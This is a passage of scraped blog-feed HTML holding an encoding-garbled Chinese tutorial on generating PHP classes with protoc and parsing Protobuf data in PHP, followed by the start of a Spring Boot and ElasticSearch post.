                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å‰é˜µå­åšçš„ä¸€ä¸ªç›´æ’­å¼¹å¹•çš„æœºå™¨äººï¼Œå…¶ä¸­æœ‰ä¸€éƒ¨åˆ†ä¸Šæ¸¸æ•°æ®æ˜¯é€šè¿‡ Protobuf è¿”å›çš„ã€‚å‡ ä¸ªæœ‹å‹é—®æˆ‘æ€ä¹ˆå¤„ç†ï¼Œä½†æˆ‘å‘ç°å¤§å®¶å¯¹ã€ŒPHP è§£æ Protobufã€è¿™ä»¶äº‹å¤šå°‘æœ‰ç‚¹è¿·ç³Šã€‚ç¡®å®ï¼ŒPHP å¤„ç† Protobuf çš„èµ„æ–™ä¸å¤šï¼Œè€Œä¸”è¸©å‘æˆæœ¬ä¸ç®—ä½ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ä¸æ‰“ç®—ç§‘æ™®ä»€ä¹ˆï¼Œä¹Ÿæ²¡æœ‰æ¨èä»»ä½•æŠ€æœ¯æ ˆçš„æ„æ€ï¼Œå°±æ˜¯æŠŠæˆ‘è‡ªå·±æ‘¸ç´¢çš„è¿‡ç¨‹æ•´ç†å‡ºæ¥ï¼Œç»™é‡åˆ°ç±»ä¼¼é—®é¢˜çš„äººä¸€ä¸ªå‚è€ƒã€‚</p>
<hr/>
<h2 data-id="heading-0">Protobuf æ˜¯ä»€ä¹ˆ</h2>
<p>å¾ˆå¤šäººç¬¬ä¸€æ¬¡æ¥è§¦å®ƒæ—¶ï¼Œä¼šæŠŠå®ƒå’Œ JSONã€XML æ”¾åœ¨ä¸€èµ·ç†è§£ï¼Œä½† Protobuf å¹¶ä¸æ˜¯â€œå¦ä¸€ä¸ª JSONâ€ã€‚å®ƒæ˜¯ä¸€ç§ â€‹<strong>åŸºäº Schema çš„äºŒè¿›åˆ¶æ•°æ®æ ¼å¼</strong>ï¼Œæœ¬è´¨ä¸Šç”±ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p>
<ul>
<li>â€‹<code>.proto</code>ï¼šæ•°æ®ç»“æ„çš„æè¿°æ–‡ä»¶ï¼ˆç±»ä¼¼å­—å…¸ï¼‰</li>
<li>äºŒè¿›åˆ¶æ ¼å¼ï¼šæ ¹æ® <code>.proto</code> è§„åˆ™ç¼–ç å‡ºæ¥çš„æ•°æ®</li>
</ul>
<p>Google å‘æ˜å®ƒçš„åŸå› å¤§è‡´æ˜¯ï¼š</p>
<ul>
<li>JSON å¤ªå¤§ã€å¤ªæ…¢</li>
<li>åœ¨é«˜æ€§èƒ½ã€è·¨è¯­è¨€é€šä¿¡åœºæ™¯é‡Œä¸å¤Ÿç†æƒ³</li>
<li>æœåŠ¡ç«¯å†…éƒ¨å¤§é‡ RPC è°ƒç”¨æ—¶ï¼Œåºåˆ—åŒ–æ•ˆç‡å¤ªé‡è¦äº†</li>
</ul>
<p>äºæ˜¯æœ‰äº† Protobufï¼šæ•°æ®æ ¼å¼ç´§å‡‘ã€åºåˆ—åŒ–é€Ÿåº¦å¿«ã€è·¨è¯­è¨€æ”¯æŒä¹Ÿå¼ºã€‚</p>
<p>å®ƒä¸æ˜¯ä¸ºäº†å¯è¯»æ€§ï¼Œè€Œæ˜¯ä¸ºäº†æ€§èƒ½ã€‚</p>
<hr/>
<h2 data-id="heading-1">PHP è§£æ Protobuf ä¸ºä»€ä¹ˆéº»çƒ¦</h2>
<p>PHP èƒ½è§£æ Protobufï¼Œä½†ä½“éªŒä¸å¦‚å…¶ä»–è¯­è¨€ã€‚åŸå› æœ‰å‡ ä¸ªï¼Œç®€å•åˆ—ä¸€ä¸‹ï¼š</p>
<h3 data-id="heading-2">PHP æ— æ³•åŠ¨æ€è§£æ Schema</h3>
<p>åƒ Goã€Pythonã€Java è¿™ç±»è¯­è¨€å¯ä»¥ä¾é  descriptor åŠ¨æ€è§£æ Protobuf æ•°æ®ç»“æ„ï¼Œç”šè‡³å¯ä»¥åœ¨è¿è¡ŒæœŸå¤„ç†æœªçŸ¥ç»“æ„ã€‚</p>
<p>PHP ç›®å‰åšä¸åˆ°ï¼Œæ²¡æœ‰æš´éœ²é‚£ä¸€å¥— APIã€‚</p>
<p>æ‰€ä»¥ PHP â€‹<strong>å¿…é¡»ä¾èµ– .proto æ–‡ä»¶</strong>ï¼Œå¹¶ä¸”å¿…é¡»æå‰ç”¨ protoc ç”Ÿæˆå¯¹åº”çš„ PHP ç±»ã€‚</p>
<h3 data-id="heading-3">PHP çš„ Protobuf æ‰©å±•æ˜¯â€œæœ€å°å®ç°â€</h3>
<p>google/protobuf çš„ PHP æ‰©å±•åªæä¾›ï¼š</p>
<ul>
<li>åºåˆ—åŒ–ï¼šserialize</li>
<li>ååºåˆ—åŒ–ï¼šmergeFrom</li>
<li>åŸºæœ¬çš„ getter/setter æœºåˆ¶</li>
</ul>
<p>å…¶ä»–é«˜çº§èƒ½åŠ›åŸºæœ¬æ²¡æœ‰ã€‚</p>
<h3 data-id="heading-4">PHP çš„ç”Ÿæ€ä¹Ÿä¸ä¼šæŠŠâ€œè§£æäºŒè¿›åˆ¶åè®®â€å½“ä½œä¸»è¦ç”¨é€”</h3>
<p>PHP çš„å¸¸è§ä½¿ç”¨åœºæ™¯å Webï¼Œå› æ­¤å¤„ç†äºŒè¿›åˆ¶åè®®å¹¶ä¸æ˜¯é‡ç‚¹ã€‚</p>
<h3 data-id="heading-5">å¹¶ä¸æ˜¯æˆ‘ä»¬ä¸»åŠ¨é€‰æ‹© Protobuf</h3>
<p>åœ¨ä¸€äº›æœåŠ¡é‡Œï¼Œä¸Šæ¸¸æœåŠ¡å·²ç»å®šæ­»ä½¿ç”¨ Protobufï¼›æˆ–è€… PHP æœåŠ¡åªæ˜¯è¾¹ç¼˜ç½‘å…³ï¼Œéœ€è¦è§£æä¸€æ¬¡å†è½¬å‘ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªæœ‰ç¡¬ç€å¤´çš®æ”¯æŒã€‚</p>
<p>å¦‚æœæ˜¯è‡ªå·±çš„é¡¹ç›®ï¼Œå¹¶æ²¡æœ‰å¼ºçº¦æŸï¼Œå…¶å® JSON è¶³å¤Ÿäº†ã€‚</p>
<hr/>
<h2 data-id="heading-6">PHP å¦‚ä½•ä½¿ç”¨ Protobuf</h2>
<p>æˆ‘è‡ªå·±åœ¨æœåŠ¡å™¨ä¸Šæ²¡æœ‰å®‰è£… Protobuf æ‰©å±•ï¼Œè€Œæ˜¯é‡‡ç”¨æ›´å¸¸è§çš„ä¸€ç§æ–¹å¼ï¼š</p>
<ul>
<li>æœ¬åœ°å®‰è£… <code>protoc</code></li>
<li>ç”¨ <code>.proto</code> æ–‡ä»¶ç”Ÿæˆ PHP ç±»</li>
<li>æœåŠ¡å™¨ç«¯åªéœ€è¦å®‰è£… <code>google/protobuf</code> åŒ…å³å¯å®Œæˆè§£æ</li>
</ul>
<h3 data-id="heading-7">ç¬¬ä¸€æ­¥ï¼šå®‰è£…è¿è¡Œæ—¶åº“</h3>
<pre><code class="hljs language-bash" lang="bash">composer require google/protobuf
</code></pre>
<p>è¿™æ˜¯ PHP è§£æ Protobuf æ‰€éœ€çš„å”¯ä¸€è¿è¡Œæ—¶ä¾èµ–ã€‚</p>
<h3 data-id="heading-8">ç¬¬äºŒæ­¥ï¼šå®‰è£… protocï¼ˆåœ¨æœ¬åœ°ï¼‰</h3>
<p>protoc æ˜¯å®˜æ–¹ç¼–è¯‘å™¨ï¼Œç”¨äºæŠŠ <code>.proto</code> æ–‡ä»¶ç”Ÿæˆå„ç§è¯­è¨€çš„ç±»ï¼ˆåŒ…æ‹¬ PHPï¼‰ã€‚</p>
<p>ä¸‹è½½åœ°å€ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fprotocolbuffers%2Fprotobuf%2Freleases" target="_blank" title="https://github.com/protocolbuffers/protobuf/releases" ref="nofollow noopener noreferrer">github.com/protocolbufâ€¦</a></p>
<p>é€‰æ‹©å¯¹åº”å¹³å°çš„å‹ç¼©åŒ…ï¼Œè§£å‹åæŠŠ <code>protoc</code> æ”¾åˆ° PATH ä¸­å³å¯ã€‚</p>
<p>éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p>
<pre><code class="hljs language-bash" lang="bash">protoc --version
</code></pre>
<hr/>
<h2 data-id="heading-9">.proto æ–‡ä»¶æ˜¯ä»€ä¹ˆ</h2>
<p>â€‹<code>.proto</code> æ–‡ä»¶å¯ä»¥ç®€å•ç†è§£ä¸ºâ€œæ•°æ®ç»“æ„çš„ä¸€ä»½å­—å…¸â€ã€‚</p>
<p>å› ä¸º Protobuf çš„äºŒè¿›åˆ¶æ ¼å¼é‡Œæ²¡æœ‰å­—æ®µåï¼Œåªæœ‰å­—æ®µç¼–å·ï¼ˆtagï¼‰ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-text" lang="text">field #1:  123
field #2: "Alice"
</code></pre>
<p>ä½ ä¸çŸ¥é“ #1 æ˜¯ <code>id</code>â€‹ è¿˜æ˜¯ <code>age</code>â€‹ï¼Œä¹Ÿä¸çŸ¥é“ #2 æ˜¯ <code>name</code> è¿˜æ˜¯åˆ«çš„ä¸œè¥¿ã€‚</p>
<p>æ‰€ä»¥å¿…é¡»ä¾é  <code>.proto</code> æ–‡ä»¶æ‰èƒ½è§£ç ã€‚</p>
<hr/>
<h2 data-id="heading-10">ä½¿ç”¨ protoc ç”Ÿæˆ PHP ç±»</h2>
<p>æˆ‘æœ¬åœ°çš„å‘½ä»¤å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">protoc --php_out=./protobuf \
       --proto_path=./protobuf \
       xxx.proto
</code></pre>
<p>å«ä¹‰å¦‚ä¸‹ï¼š</p>
<ul>
<li>â€‹<code>--php_out</code>ï¼šç”Ÿæˆçš„ PHP æ–‡ä»¶å­˜æ”¾ä½ç½®</li>
<li>â€‹<code>--proto_path</code>â€‹ï¼šå¯»æ‰¾ <code>.proto</code> çš„ç›®å½•</li>
<li>å¤šä¸ª .proto å¯ä»¥ä¸€èµ·ç¼–è¯‘</li>
</ul>
<p>protoc ä¼šæ ¹æ® <code>.proto</code>â€‹ å†…å®¹ç”Ÿæˆä¸€å † PHP ç±»ï¼Œæ¯ä¸ª <code>message</code> å¯¹åº”ä¸€ä¸ª PHP ç±»ï¼Œæœ€ç»ˆè¿™äº›ç±»ä¼šç»§æ‰¿ï¼š</p>
<pre><code class="hljs language-text" lang="text">Google\Protobuf\Internal\Message
</code></pre>
<p>åºåˆ—åŒ–ã€ååºåˆ—åŒ–åŠŸèƒ½éƒ½æ¥è‡ªè¿™ä¸ªåŸºç±»ã€‚</p>
<hr/>
<h2 data-id="heading-11">é…ç½® Composer autoload</h2>
<p>å¦‚æœä½ å¸Œæœ›é€šè¿‡å‘½åç©ºé—´åŠ è½½ç”Ÿæˆçš„ç±»ï¼Œå¯ä»¥åœ¨ <code>composer.json</code> ä¸­åŠ ä¸€æ¡ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"autoload"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"psr-4"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"Proto\\"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"protobuf/"</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç„¶åæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">composer dumpautoload
</code></pre>
<hr/>
<h2 data-id="heading-12">åœ¨ PHP ä¸­è§£æ Protobuf</h2>
<p>è§£æçš„æ ¸å¿ƒæ–¹æ³•æ˜¯ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$msg</span>-&gt;<span class="hljs-title function_ invoke__">mergeFromString</span>(<span class="hljs-variable">$binary</span>)
</code></pre>
<p>è¯»å®Œåï¼Œæ•°æ®ç»“æ„ä¼šè‡ªåŠ¨å¡«å……åœ¨ message å¯¹è±¡é‡Œã€‚</p>
<hr/>
<h2 data-id="heading-13">åœ¨ PHP ä¸­ç”Ÿæˆ Protobuf æ•°æ®</h2>
<p>åºåˆ—åŒ–å¯¹åº”çš„æ–¹æ³•æ˜¯ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$binary</span> = <span class="hljs-variable">$msg</span>-&gt;<span class="hljs-title function_ invoke__">serializeToString</span>();
</code></pre>
<p>å¾—åˆ°çš„å°±æ˜¯ä¸€æ®µ protobuf äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥å‘é€åˆ°ç½‘ç»œæˆ–å†™å…¥æ–‡ä»¶ã€‚</p>
<hr/>
<h2 data-id="heading-14">å¿«é€Ÿæµ‹è¯•</h2>
<p>åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">.
â”œâ”€â”€ protobuf
â”‚   â””â”€â”€ TEST_USER_INFO.proto
â””â”€â”€ test.php
</code></pre>
<h3 data-id="heading-15">TEST_USER_INFO.proto</h3>
<pre><code class="hljs language-proto" lang="proto">syntax = "proto3";

option php_namespace = "TestUserInfo";

message User {
  int32 id = 1;
  string name = 2;
}
</code></pre>
<h3 data-id="heading-16">test.php</h3>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/vendor/autoload.php'</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">TestUserInfo</span>\<span class="hljs-title">User</span>;

<span class="hljs-variable">$u1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable">$u1</span>-&gt;<span class="hljs-title function_ invoke__">setId</span>(<span class="hljs-number">7</span>);
<span class="hljs-variable">$u1</span>-&gt;<span class="hljs-title function_ invoke__">setName</span>(<span class="hljs-string">"PHP Encode Test"</span>);

<span class="hljs-variable">$bin</span> = <span class="hljs-variable">$u1</span>-&gt;<span class="hljs-title function_ invoke__">serializeToString</span>();

<span class="hljs-variable">$u2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable">$u2</span>-&gt;<span class="hljs-title function_ invoke__">mergeFromString</span>(<span class="hljs-variable">$bin</span>);

<span class="hljs-title function_ invoke__">var_dump</span>([
    <span class="hljs-string">'åŸå§‹æ•°æ®'</span> =&gt; <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$bin</span>),
    <span class="hljs-string">'id'</span> =&gt; <span class="hljs-variable">$u2</span>-&gt;<span class="hljs-title function_ invoke__">getId</span>(),
    <span class="hljs-string">'name'</span> =&gt; <span class="hljs-variable">$u2</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>(),
]);
</code></pre>
<hr/>
<h3 data-id="heading-17">å®‰è£…è¿è¡Œæ—¶åº“</h3>
<pre><code class="hljs language-bash" lang="bash">composer require google/protobuf
</code></pre>
<hr/>
<h3 data-id="heading-18">ç¼–è¯‘ .proto æ–‡ä»¶</h3>
<pre><code class="hljs language-bash" lang="bash">protoc --php_out=./protobuf --proto_path=./protobuf TEST_USER_INFO.proto
</code></pre>
<p>è¿™ä¼šåœ¨ <code>protobuf/</code> ç›®å½•ä¸‹ç”Ÿæˆ PHP ç±»æ–‡ä»¶ï¼Œä¾› PHP ä½¿ç”¨ã€‚</p>
<hr/>
<h3 data-id="heading-19">é…ç½® Composer autoload</h3>
<p>åœ¨ <code>composer.json</code> ä¸­å¢åŠ å‘½åç©ºé—´æ˜ å°„ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"require"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"google/protobuf"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.33"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"autoload"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"psr-4"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"GPBMetadata\\"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"protobuf/GPBMetadata"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"TestUserInfo\\"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"protobuf/TestUserInfo"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç„¶åé‡æ–°åŠ è½½ Composer è‡ªåŠ¨åŠ è½½ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">composer clear-cache &amp;&amp; composer dump-autoload -o
</code></pre>
<h3 data-id="heading-20">è¿è¡Œæµ‹è¯•</h3>
<pre><code class="hljs language-bash" lang="bash">php test.php
</code></pre>
<p>è¿è¡Œåï¼Œä½ ä¼šçœ‹åˆ°åºåˆ—åŒ–å†ååºåˆ—åŒ–çš„æ•°æ®è¢«æ­£ç¡®è¾“å‡ºï¼Œè¯æ˜ PHP æˆåŠŸå¤„ç†äº† Protobuf æ•°æ®ã€‚</p>
<h2 data-id="heading-21">å†™åœ¨æœ€å</h2>
<p>PHP è§£æ Protobuf çš„ä½“éªŒç¡®å®ä¸ç®—å¥½ï¼Œä½†èƒ½ç”¨ï¼Œå¹¶ä¸”åœ¨æŸäº›éœ€è¦å…¼å®¹ä¸Šæ¸¸æœåŠ¡çš„åœºæ™¯é‡Œè¿˜æ˜¯å¿…é¡»ç”¨ã€‚<br/>
å¦‚æœä½ ä¹Ÿæ­£åœ¨å¤„ç†ç±»ä¼¼çš„æ•°æ®ï¼Œå¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®ä½ å°‘è¸©ç‚¹å‘ã€‚</p>
<p>å¦‚æœæ„Ÿè§‰æ–‡ç« é‡Œå“ªéƒ¨åˆ†è¿˜æ²¡è¯´æ¸…æ¥šï¼Œæ¬¢è¿ç»§ç»­äº¤æµã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot é›†æˆ ElasticSearch çš„ç®€å•ç¤ºä¾‹]]></title>    <link>https://juejin.cn/post/7582863493259624500</link>    <guid>https://juejin.cn/post/7582863493259624500</guid>    <pubDate>2025-12-13T07:12:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582863493259624500" data-draft-id="7582848701268033571" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot é›†æˆ ElasticSearch çš„ç®€å•ç¤ºä¾‹"/> <meta itemprop="keywords" content="Spring Boot,è®¾è®¡"/> <meta itemprop="datePublished" content="2025-12-13T07:12:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Somehow007"/> <meta itemprop="url" content="https://juejin.cn/user/2425968473158731"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot é›†æˆ ElasticSearch çš„ç®€å•ç¤ºä¾‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2425968473158731/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Somehow007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T07:12:59.000Z" title="Sat Dec 13 2025 07:12:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media 